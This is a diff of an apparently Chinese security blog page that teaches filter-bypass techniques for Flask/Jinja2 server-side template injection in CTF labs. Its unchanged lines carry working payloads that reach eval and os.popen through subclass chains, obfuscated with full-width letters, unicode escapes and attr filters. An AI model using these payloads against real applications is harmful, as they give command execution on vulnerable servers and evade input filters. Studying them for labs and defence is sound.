@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87-%E6%9C%89%E5%9B%9E%E6%98%BE/7.jpg">
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87-%E6%9C%89%E5%9B%9E%E6%98%BE/8.jpg">
 <meta property="article:published_time" content="2024-12-26T07:48:06.000Z">
-<meta property="article:modified_time" content="2024-12-29T06:53:21.518Z">
+<meta property="article:modified_time" content="2024-12-29T07:03:56.688Z">
 <meta property="article:author" content="AAAAl">
 <meta property="article:tag" content="ssti绕过">
 <meta property="article:tag" content="ssti有回显注入">
@@ -81,7 +81,7 @@
 <div class="widgets">
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87-%E6%9C%89%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-绕过-有回显</span></a><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87-%E6%9C%89%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-绕过-有回显</span></a></div></widget>
 </div>
 <footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/AAAA-l" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"></a></div></footer>
 </div></aside><div class="l_main" id="main">
@@ -94,7 +94,7 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/python/">python</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/python/ssti/">ssti</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/python/ssti/%E7%BB%95%E8%BF%87/">绕过</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/python/ssti/%E7%BB%95%E8%BF%87/%E6%9C%89%E5%9B%9E%E6%98%BE/">有回显</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-26T07:48:06.000Z">2024-12-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-29T06:53:21.518Z">2024-12-29</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-26T07:48:06.000Z">2024-12-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-29T07:03:56.688Z">2024-12-29</time></span></div></div></div>
     
   </div>
   </div><article class="md-text content"><p>[TOC]</p>
@@ -131,7 +131,7 @@
 <li>记得先url编码再张贴到bp中</li>
 </ul>
 <p>建议一般情况下面不要使用这个方法，只有当英文全部被过滤时可以考虑。</p>
-<p>给出一个相似unicode寻找网站：<a target="_blank" rel="noopener" href="https://shapecatcher.com/unicode/block/Mathematical_Alphanumeric_Symbols">https://shapecatcher.com/unicode/block/Mathematical_Alphanumeric_Symbols</a></p>
+<p>给出一个<strong>相似unicode寻找网站</strong>：<a target="_blank" rel="noopener" href="https://shapecatcher.com/unicode/block/Mathematical_Alphanumeric_Symbols">https://shapecatcher.com/unicode/block/Mathematical_Alphanumeric_Symbols</a></p>
 <h4 id="全角英文"><a href="#全角英文" class="headerlink" title="全角英文"></a>全角英文</h4><p>使用方式和unicode字符欺骗类似。</p>
 <p>给出一个payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__ｉｍｐｏｒｔ__(&#x27;\u006f\u0073&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure>
@@ -140,7 +140,7 @@
 <p><strong>测试结果：</strong></p>
 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87-%E6%9C%89%E5%9B%9E%E6%98%BE/5.jpg" class="lazy" title="全角英文测试结果">
 
-<p>可以看到<code>__ｉｍｐｏｒｔ__</code>被成功解析了。****</p>
+<p>可以看到<code>__ｉｍｐｏｒｔ__</code>被成功解析了。</p>
 <h4 id="base64编码（只限于python2环境）"><a href="#base64编码（只限于python2环境）" class="headerlink" title="base64编码（只限于python2环境）"></a>base64编码（只限于python2环境）</h4><p>这里具体的flask环境我们就不搭建了，来看一下使用方法即可，这里主要是借助的字符串中的decode方法。</p>
 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87-%E6%9C%89%E5%9B%9E%E6%98%BE/6.jpg" class="lazy" title="python2中base64测试结果">
 
@@ -220,12 +220,12 @@
 <p>这个时候我们可以将返回的对象<strong>整体使用()包裹起来再使用[]进行访问</strong>，如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#123;(()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]&#125;&#125;<br><br>&#123;&#123;(((()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;))[&#x27;__builtins__&#x27;]&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p>这样写的话，整个payload就过于复杂，容易出现错误，而且[]被过滤了的话，上面就无法绕过了。我们这里可以使用**<code>__getitem__</code>魔术方法<strong>，我们在</strong>使用[]来访问字典或者列表中的元素时就是在隐式地调这个方法**。</p>
+<p>这样写的话，整个payload就过于复杂，容易出现错误，而且[]被过滤了的话，上面就无法绕过了。我们这里可以使用<code>__getitem__</code>魔术方法，我们在<strong>使用[]来访问字典或者列表中的元素时就是在隐式地调这个方法</strong>。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#123;()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(412)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;eval&#x27;)(&quot;__\u0069\u006d\u0070\u006f\u0072\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>我们这里还可以使用<strong>pop方法</strong>来访问代码<code>__getitem__</code>，这个方法返回对应的元素时也会将元素从列表或者字典中删除，所以一般不推荐使用。</p>
 <p>其中针对字典对象，我们还可以使用<strong>get方法和setdefault方法</strong>来获取字典中的元素。</p>
-<p>还有使用**<code>__dict__</code>魔术属性<strong>，这个属性储存的是对象中的所有属性，以字典的形式，也就是我们使用他来访问属性还得使用</strong>[]<strong>，再加上他本身也带有</strong>下划线<strong>，所以这个方法比较</strong>鸡肋**。</p>
+<p>还有使用<code>__dict__</code>魔术属性，这个属性储存的是对象中的所有属性，以字典的形式，也就是我们使用他来访问属性还得使用**[]<strong>，再加上他本身也带有</strong>下划线<strong>，所以这个方法比较</strong>鸡肋**。</p>
 <p><strong>vars函数</strong>，也可以使用来访问对象的属性，但是使用起来比较麻烦，这里权当记录一下。</p>
 <h4 id="想方法使用其他关键字进行代替"><a href="#想方法使用其他关键字进行代替" class="headerlink" title="想方法使用其他关键字进行代替"></a>想方法使用其他关键字进行代替</h4><p>非字符串中的关键字被过滤了，如果不转换为字符串形式，那么基本没有什么好的绕过方法。这个时候可以祈祷对方过滤不全，同时还可以寻找到其他具有类似功能的关键字进行代替。如<code>__base__</code>被过滤，我们还可以使用<code>__mro__</code>。</p>
 <p>其实我们前面使用的payload都太长了，一方面是很容易踩到对方的黑名单，另一方面是手注的时候很容易出现错误，还不易察觉错误出现在哪里。所以我们一般是不使用上面这种payload的。我们可以进行精简。这也是使用其他关键字进行代替的一种思想，只要最终能够达到目的即可。</p>
@@ -295,13 +295,13 @@
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><hr>
 <p>references:</p>
 <ul>
-<li>‘<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/111399386#:~:text=CTF%E4%B8%AD%E4%B8%80%E8%88%AC%E8%80%83%E7%9A%84%E5%B0%B1%E6%98%AF"></a>‘</li>
-<li>‘<a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/#:~:text=jinja2%E4%B8%AD%E9%99%A4%E4%BA%86P"></a>‘</li>
-<li>‘<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647?u_atoken=765636e18b3ac622f613d092244c2293&u_asig=1a0c39d417287388018931091e003a&time__1311=n4+hBKDK0KY57IPAKD=D/bFnT/YRmImwp5=x#toc-11">这个是讲解沙箱绕过的，但是两者有很多相通的地方</a>‘</li>
-<li>‘<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIq7IYGIqYvAM4jOTbD#toc-13">这个是讲原型链污染的，讲得很全面，里面有讲到了对Jinja2语法标识的污染</a>‘</li>
-<li>‘<a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e">CTFshow 单身杯CTF 官方WP</a>‘</li>
-<li>‘<a target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs">sstilabs</a>‘</li>
-<li>‘<a target="_blank" rel="noopener" href="https://ctf.show/challenges#">ctfshow</a>‘</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/111399386#:~:text=CTF%E4%B8%AD%E4%B8%80%E8%88%AC%E8%80%83%E7%9A%84%E5%B0%B1%E6%98%AF">https://blog.csdn.net/qq_38154820/article/details/111399386#:~:text=CTF%E4%B8%AD%E4%B8%80%E8%88%AC%E8%80%83%E7%9A%84%E5%B0%B1%E6%98%AF</a></li>
+<li><a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/#:~:text=jinja2%E4%B8%AD%E9%99%A4%E4%BA%86P">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/#:~:text=jinja2%E4%B8%AD%E9%99%A4%E4%BA%86P</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647?u_atoken=765636e18b3ac622f613d092244c2293&u_asig=1a0c39d417287388018931091e003a&time__1311=n4+hBKDK0KY57IPAKD=D/bFnT/YRmImwp5=x#toc-11">这个是讲解沙箱绕过的，但是两者有很多相通的地方</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIq7IYGIqYvAM4jOTbD#toc-13">这个是讲原型链污染的，讲得很全面，里面有讲到了对Jinja2语法标识的污染</a></li>
+<li><a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e">CTFshow 单身杯CTF 官方WP</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs">sstilabs</a></li>
+<li><a target="_blank" rel="noopener" href="https://ctf.show/challenges#">ctfshow</a></li>
 <li>…</li>
 </ul>
 <hr>
